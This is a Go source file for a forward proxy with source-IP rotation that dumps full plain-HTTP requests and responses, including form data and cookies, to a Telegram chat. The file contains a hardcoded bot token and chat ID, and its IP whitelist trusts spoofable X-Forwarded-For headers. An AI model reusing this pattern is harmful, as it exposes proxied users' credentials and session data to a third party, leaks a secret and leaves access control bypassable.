package main

import (
	"bytes"
	"compress/gzip"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"github.com/spf13/viper"
	tele "gopkg.in/telebot.v3"
	"gopkg.in/tucnak/telebot.v2"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"os"
	"strings"
	"sync"
	"time"
)

// 创建一个消息通道
var messageChannel = make(chan string, 100) // 缓冲通道，根据需要调整大小

func sendTelegramAlert(message string) {
	messageChannel <- message
}

var (
	DNSCache   sync.Map
	bufferPool = sync.Pool{
		New: func() interface{} {
			return make([]byte, 32*1024) // 分配一个32KB大小的缓冲区
		},
	}
)

func EscapeText(text string) string {
	replacer := strings.NewReplacer(
		"_", "\\_", "*", "\\*", "[", "\\[", "]", "\\]", "(",
		"\\(", ")", "\\)", "~", "\\~", "`", "\\`", ">", "\\>",
		"#", "\\#", "+", "\\+", "-", "\\-", "=", "\\=", "|",
		"\\|", "{", "\\{", "}", "\\}", ".", "\\.", "!", "\\!",
	)

	return replacer.Replace(text)
}

func init() {
	// 设置viper的配置参数
	viper.SetConfigName("config") // 配置文件名
	viper.SetConfigType("yaml")   // 配置文件类型，可以是yaml,json,toml等
	viper.AddConfigPath(".")      // 配置文件路径

	// 读取配置文件
	if err := viper.ReadInConfig(); err != nil {
		log.Fatalf("Error reading config file, %s", err)
	}
}

func randomIPV6FromSubnet(network string) (net.IP, error) {
	_, subnet, err := net.ParseCIDR(network)
	if err != nil {
		return nil, err
	}

	ones, bits := subnet.Mask.Size()
	prefix := subnet.IP.To16()

	// Create random bytes for the remaining parts of the address.
	randomBytes := make([]byte, (bits-ones)/8)
	_, err = rand.Read(randomBytes)
	if err != nil {
		return nil, err
	}

	// Combine the subnet and random parts.
	for i, b := range randomBytes {
		prefix[ones/8+i] = b
	}

	return prefix, nil
}

func handleTunneling(w http.ResponseWriter, r *http.Request) {
	var ips []string

	// Get the host without the port
	host, _, err := net.SplitHostPort(r.Host)
	if err != nil {
		// Handle missing port error specifically
		if addrError, ok := err.(*net.AddrError); ok && addrError.Err == "missing port in address" {
			host = r.Host
		} else {
			http.Error(w, err.Error(), http.StatusServiceUnavailable)
			return
		}
	}

	_, isIpv6, err := getIPAddress(host)
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}

	var ip string
	ipv6sub := viper.GetString("IP6SUB")
	if isIpv6 && ipv6sub != "" {
		ipv6FromSubnet, err := randomIPV6FromSubnet(ipv6sub)
		if err != nil {
			log.Println(err.Error())
			http.Error(w, err.Error(), http.StatusServiceUnavailable)
			return
		}
		ip = ipv6FromSubnet.String()
	} else {
		if isIpv6 {
			ips = viper.GetStringSlice("IP6S")
		} else {
			ips = viper.GetStringSlice("IPS")
		}
		if len(ips) == 0 {
			log.Println("No IP found")
			http.Error(w, "No IP found", http.StatusServiceUnavailable)
			return
		}
		// Securely select a random index to choose an IP address
		index, err := secureRandomInt(len(ips))
		if err != nil {
			log.Fatalf("Failed to generate a secure random index: %v", err)
		}
		ip = ips[index]
	}

	log.Println("Selected IP:", ip)

	dialer := &net.Dialer{
		LocalAddr: &net.TCPAddr{IP: net.ParseIP(ip), Port: 0},
	}

	destConn, err := dialer.Dial("tcp", r.Host)
	if err != nil {
		log.Printf("Dial error: %v", err)
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}
	defer destConn.Close()

	w.WriteHeader(http.StatusOK)

	hijacker, ok := w.(http.Hijacker)
	if !ok {
		http.Error(w, "Hijacking not supported", http.StatusInternalServerError)
		return
	}
	clientConn, _, err := hijacker.Hijack()
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}
	defer clientConn.Close() // 确保在函数退出时关闭clientConn

	// 使用WaitGroup等待两个数据传输完成
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		transfer(destConn, clientConn)
	}()
	go func() {
		defer wg.Done()
		transfer(clientConn, destConn)
	}()

	// 等待数据传输完成
	wg.Wait()
}

func transfer(destination io.WriteCloser, source io.ReadCloser) {
	buff := bufferPool.Get().([]byte)
	defer bufferPool.Put(buff)

	if _, err := io.CopyBuffer(destination, source, buff); err != nil {
		log.Printf("Error during data transfer: %v", err)
	}
}

func isPrintableContentType(contentType string) bool {
	return strings.HasPrefix(contentType, "text/") ||
		strings.Contains(contentType, "json") ||
		strings.Contains(contentType, "xml") ||
		strings.Contains(contentType, "javascript") ||
		strings.Contains(contentType, "ecmascript") ||
		strings.Contains(contentType, "csv") ||
		strings.Contains(contentType, "rtf") ||
		strings.Contains(contentType, "xhtml+xml") ||
		strings.Contains(contentType, "svg+xml") ||
		strings.HasPrefix(contentType, "application/x-www-form-urlencoded") ||
		strings.HasPrefix(contentType, "multipart/form-data")
}

func handleHTTP(w http.ResponseWriter, req *http.Request) {
	// 捕获请求细节
	dump, _ := httputil.DumpRequest(req, true)
	reqDetails := fmt.Sprintf("请求: %s\n", dump)
	log.Printf("请求: %s %s %s\n", req.Method, req.Host, req.URL.Path)
	resp, err := http.DefaultTransport.RoundTrip(req)
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		go sendTelegramAlert("请求失败: " + err.Error())
		return
	}
	defer resp.Body.Close()
	log.Printf("响应: %s %d\n", req.URL.Path, resp.StatusCode)

	// 判断内容类型是否可打印
	if isPrintableContentType(resp.Header.Get("Content-Type")) {
		if resp.Header.Get("Content-Encoding") == "gzip" {
			dumpResponse, _ := httputil.DumpResponse(resp, false)
			buf, _ := io.ReadAll(resp.Body)

			gr, err := gzip.NewReader(bytes.NewBuffer(buf))
			if err == nil {
				defer gr.Close()
				// 读取解压缩的内容
				uncompressedBody, err := io.ReadAll(gr)
				if err == nil {
					respDetails := fmt.Sprintf("响应: %s\n%s\n", dumpResponse, uncompressedBody)
					go sendTelegramAlert(reqDetails + "\n" + respDetails)
				}
			}
			resp.Body = io.NopCloser(bytes.NewBuffer(buf))
		} else {
			dumpResponse, _ := httputil.DumpResponse(resp, true)
			respDetails := fmt.Sprintf("响应: %s\n", dumpResponse)
			go sendTelegramAlert(reqDetails + "\n" + respDetails)
		}
	}

	copyHeader(w.Header(), resp.Header)
	w.WriteHeader(resp.StatusCode)

	// Use the buffer pool for copying the response body
	buff := bufferPool.Get().([]byte)
	defer bufferPool.Put(buff)

	if _, err := io.CopyBuffer(w, resp.Body, buff); err != nil {
		log.Printf("Error during data transfer: %v", err)
		go sendTelegramAlert("数据传输错误: " + err.Error())
		return
	}

}

// 设置你的机器人
func setupBot(botToken string) *tele.Bot {
	bot, err := tele.NewBot(tele.Settings{
		Token:     botToken,
		ParseMode: tele.ModeMarkdownV2,
	})
	if err != nil {
		log.Fatal(err)
	}
	return bot
}
func copyHeader(dst, src http.Header) {
	for k, vv := range src {
		for _, v := range vv {
			dst.Set(k, v)
		}
	}
}

func getIPAddress(domain string) (ip string, ipv6 bool, err error) {
	if v, ok := DNSCache.Load(domain); ok {
		ipAddresses := v.([]string)
		for _, ipAddress := range ipAddresses {
			if strings.Contains(ipAddress, ":") {
				return ipAddress, true, nil
			}
		}
		return ipAddresses[0], false, nil
	}

	ipAddresses, err := net.LookupHost(domain)
	if err != nil {
		return "", false, err
	}

	// Cache for 5 minutes.
	DNSCache.Store(domain, ipAddresses)
	time.AfterFunc(5*time.Minute, func() {
		DNSCache.Delete(domain)
	})
	for _, ipAddress := range ipAddresses {
		if strings.Contains(ipAddress, ":") {
			return ipAddress, true, nil
		}
	}
	return ipAddresses[0], false, nil
}

func secureRandomInt(max int) (int, error) {
	if max <= 0 {
		return 0, fmt.Errorf("invalid max value: %d", max)
	}

	// 生成一个crypto/rand随机值
	var _rand int64
	err := binary.Read(rand.Reader, binary.BigEndian, &_rand)
	if err != nil {
		return 0, err
	}

	// 确保随机数是正数
	if _rand < 0 {
		_rand = -_rand
	}

	// 返回一个在[0, max)范围的随机整数
	return int(_rand % int64(max)), nil
}

func main() {
	// Retrieve the port from the environment or use a default.
	port, exists := os.LookupEnv("PORT")
	if !exists {
		port = "3128" // Default port for proxy servers
	}
	addr := ":" + port
	bot := setupBot("6758062193:AAG6cxVi4chdqaz4KpDT3LI51fZklcmJvHI")
	// 在main函数或其他适当的位置启动一个新的goroutine来处理消息
	go func(bot *tele.Bot) {
		defer func() {
			if err := recover(); err != nil {
				log.Printf("Error in Go routine: %s", err)
			}
		}()
		for msg := range messageChannel {
			// 如果消息长度超过了4096个字符，将其分割成多个部分
			msg = EscapeText(msg)
			for len(msg) > 0 {
				chunkSize := 4096
				if len(msg) < chunkSize {
					chunkSize = len(msg)
				}
				messagePart := msg[:chunkSize]
				msg = msg[chunkSize:]

				// 发送消息到Telegram
				chat := &telebot.Chat{ID: -4062611144}
				if _, err := bot.Send(chat, messagePart, tele.ModeMarkdownV2); err != nil {
					log.Printf("Failed to send message: %v", err)
					// 可能需要添加逻辑来处理错误，例如重试发送
				}
			}
		}
	}(bot)
	server := &http.Server{
		Addr: addr,
		Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Method == http.MethodConnect {
				handleTunneling(w, r)
			} else {
				handleHTTP(w, r)
			}
		}),
	}
	// 使用IP白名单中间件包装原始处理程序函数
	originalHandler := server.Handler
	allowedIPs := []string{"127.0.0.1", "your.allowed.ip.address"}
	server.Handler = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// 使用原始处理程序调用中间件
		ipWhitelistMiddleware(allowedIPs)(originalHandler).ServeHTTP(w, r)
	})

	log.Printf("Starting proxy server on %s", server.Addr)
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("Server failed to start: %v", err)
	}
}

func ipWhitelistMiddleware(allowedIPs []string) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			var remoteIP string
			remoteIP = r.Header.Get("X-Real-IP")
			if remoteIP == "" {
				remoteIP = r.Header.Get("X-Forwarded-For")
				if remoteIP == "" {
					remoteIP, _, _ = net.SplitHostPort(r.RemoteAddr)
				}
			}

			for _, allowedIP := range allowedIPs {
				if remoteIP == allowedIP {
					next.ServeHTTP(w, r)
					return
				}
			}
			// 未授权的 IP，发送警报
			message := fmt.Sprintf("未授权的访问尝试，来自 IP: %s", remoteIP)
			log.Println(message)
			go sendTelegramAlert(message)

			http.Error(w, "Forbidden", http.StatusForbidden)
		})
	}
}
